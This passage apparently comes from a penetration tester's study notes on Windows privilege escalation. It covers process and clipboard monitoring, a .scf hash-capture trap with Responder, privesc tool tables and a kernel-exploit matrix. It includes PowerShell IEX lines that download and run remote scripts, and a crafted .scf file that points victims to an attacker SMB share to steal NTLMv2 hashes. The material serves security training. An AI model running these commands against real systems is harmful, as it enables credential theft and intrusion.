Alternatively, 3rd-party file managers like [Explorer++](https://explorerplusplus.com/) or Q-Dir can be hosted on the SMB share and accessed like described above. The same is true for RegistryEditors: [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) and [SmallRegistryEditor](https://sourceforge.net/projects/sre/)

Alternatively, edit a windows shortcut and set the path to a desired executable in the "Target" field, e.g., _C:\Windows\System32\cmd.exe_

3. Escalate privileges to gain higher levels of access.


## Monitoring

##### From the Network
The tool [net-creds](https://github.com/DanMcInerney/net-creds) can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file

##### Process Command Lines
When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```PS
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```
E.g., host it via SMB and invoke it with PS: `IEX (iwr 'http://10.10.10.205/procmon.ps1') `

##### Clipboard
`IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')` and `Invoke-ClipboardLogger`
The script will start to monitor for entries in the clipboard and present them in the PowerShell session. We need to be patient and wait until we capture sensitive information.

## SCF on a File Share
Works before Server 2019. In later versions, the same can be achieved using .ink files.

Set the icon path of a .scf file to an SMB share hosted on our attacker machine and run [Responder](https://github.com/lgandx/Responder), e.g., with `sudo responder -wrf -v -I tun0`, to caputre NTLMv2 hashes from the users that access the directory in which the .scf file resides. We put an @ at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share.
_@Inventory.scf_ :
```
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

## Automatic Tools
---
|Tool|	Description|
---
|[Seatbelt](https://github.com/GhostPack/Seatbelt)|	C# project for performing a wide variety of local privilege escalation checks|
|[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)	|WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained [here](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)|
|[PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)	|PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found|
|[SharpUp](https://github.com/GhostPack/SharpUp)	|C# version of PowerUp|
|[JAWS](https://github.com/411Hall/JAWS)	|PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0|
|[SessionGopher](https://github.com/Arvanaghi/SessionGopher)	|SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. `Import-Module .\SessionGopher.ps1` -> `Invoke-SessionGopher -Target WINLPE-SRV01`|
|[Watson](https://github.com/rasta-mouse/Watson)	|Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.|
|[LaZagne](https://github.com/AlessandroZ/LaZagne)	|Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more. `.\lazagne.exe all`|
|[Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)	|WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported|
|[Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)	|We will use several tools from Sysinternals in our enumeration including AccessChk, PipeList, and PsService|
---
[Source](https://enterprise.hackthebox.com/academy-lab/47620/8466/modules/67/634)

## Kernel Exploits
<table>
<thead>
<tr>
<th>Base OS</th>
<th>XP</th>
<th></th>
<th></th>
<th></th>
<th>2003</th>
<th></th>
<th></th>
<th>Vista</th>
<th></th>
<th></th>
<th>2008</th>
<th></th>
<th>7</th>
<th></th>
<th>2008R2</th>
<th></th>
<th>8</th>
<th>8.1</th>
<th>2012</th>
<th>2012R2</th>
<th>10</th>
<th>2016</th>
</tr>
</thead>
<tbody>
<tr>
<td>Service Pack</td>
<td>SP0</td>
<td>SP1</td>
<td>SP2</td>
<td>SP3</td>
<td>SP0</td>
<td>SP1</td>
<td>SP2</td>
<td>SP0</td>
<td>SP1</td>
<td>SP2</td>
<td>SP0</td>
<td>SP2</td>
<td>SP0</td>
<td>SP1</td>
<td>SP0</td>
<td>SP1</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS03-026</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS05-039</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS08-025</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS08-067</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS08-068</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS09-012</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS09-050</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS10-015</td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS10-059</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS10-092</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS11-011</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS11-046</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS11-062</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS11-080</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS13-005</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS13-053</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS13-081</td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-002</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-040</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-058</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-062</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-068</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-070</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-001</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-010</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-051</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-061</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-076</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-078</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-097</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
</tr>
<tr>
<td>MS16-016</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS16-032</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS16-135</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
</tr>
<tr>
<td>MS17-010</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
</tr>
<tr>
<td>CVE-2017-0213: COM Aggregate Marshaler</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
</tr>
<tr>
<td>Hot Potato</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
</tr>
<tr>
<td>SmashedPotato</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
</tr>
</tbody>
</table>

[Source](https://enterprise.hackthebox.com/academy-lab/47620/8466/modules/67/627)

## Security Features

##### Windows Server
<table>
<thead>
<tr>
<th>Feature</th>
<th>Server 2008 R2</th>
<th>Server 2012 R2</th>
<th>Server 2016</th>
<th>Server 2019</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection">Enhanced Windows Defender Advanced Threat Protection (ATP)</a></td>
<td></td>
<td></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1">Just Enough Administration</a></td>
<td>Partial</td>
<td>Partial</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard">Credential Guard</a></td>
<td></td>
<td></td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard">Remote Credential Guard</a></td>
<td></td>
<td></td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419">Device Guard (code integrity)</a></td>
<td></td>
<td></td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">AppLocker</a></td>
<td>Partial</td>
<td>X</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://www.microsoft.com/en-us/windows/comprehensive-security">Windows Defender</a></td>
<td>Partial</td>
<td>Partial</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a></td>
<td></td>
<td></td>
<td>X</td>
<td>X</td>
</tr>
</tbody>
</table>
[Source](https://enterprise.hackthebox.com/academy-lab/47620/8466/modules/67/912)

##### Windows Desktop
<table>
<thead>
<tr>
<th>Feature</th>
<th>Windows 7</th>
<th>Windows 10</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/">Microsoft Password (MFA)</a></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview">BitLocker</a></td>
<td>Partial</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard">Credential Guard</a></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard">Remote Credential Guard</a></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td><a href="https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419">Device Guard (code integrity)</a></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">AppLocker</a></td>
<td>Partial</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://www.microsoft.com/en-us/windows/comprehensive-security">Windows Defender</a></td>
<td>Partial</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a></td>
<td></td>
<td>X</td>
</tr>
</tbody>
</table>
[Source](https://enterprise.hackthebox.com/academy-lab/47620/8466/modules/67/913)

## Source


---
```dataview
table without id
    file.link as "Related Topics"
FROM "02 - Secondary Categories"
WHERE contains(file.outlinks, this.file.link) OR contains(file.inlinks, this.file.link) AND file.name != this.file.name
SORT file.name
SORT !(contains(primaryTopic, this.file.link))
```
```dataview
table without id
    file.link as "Related Content", primaryTopic as "Primary Topic"
FROM "03 - Content"
WHERE contains(file.outlinks, this.file.link)
SORT file.name
SORT !(contains(primaryTopic, this.file.link))
```
___



